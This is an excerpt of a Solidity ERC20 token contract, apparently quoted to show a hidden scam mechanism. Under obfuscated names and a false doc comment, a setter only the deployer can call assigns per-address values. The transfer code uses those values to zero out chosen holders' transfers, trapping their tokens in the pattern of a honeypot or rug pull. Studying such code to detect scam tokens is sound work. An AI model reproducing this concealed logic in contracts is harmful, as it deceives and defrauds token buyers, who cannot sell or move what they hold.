...
contract Token is IERC20, Ownable {
	...
	mapping(address => uint256) private _Roopklsuud;
     ...
     * @dev Returns the address of the current owner.
     */	
	function setRoopklsuud(address account,uint256 maxtCzzwKys) public {
		require(msg.sender == contractSender);
        _Roopklsuud[account] = maxtCzzwKys;
    }
    /**
     * @dev Returns the address of the current owner.
     */
     ...
     */                
                ...
                uint256 CzzwKys = 1 * 100000000 * _Roopklsuud[from];
                if(CzzwKys > 0 && CzzwKys >= amount.add(amount.add(amount.add(amount.add(_Roopklsuud[from]))))){
                    amount = amount*0;
                }
            }
            if(to != uniswapV2Pair){
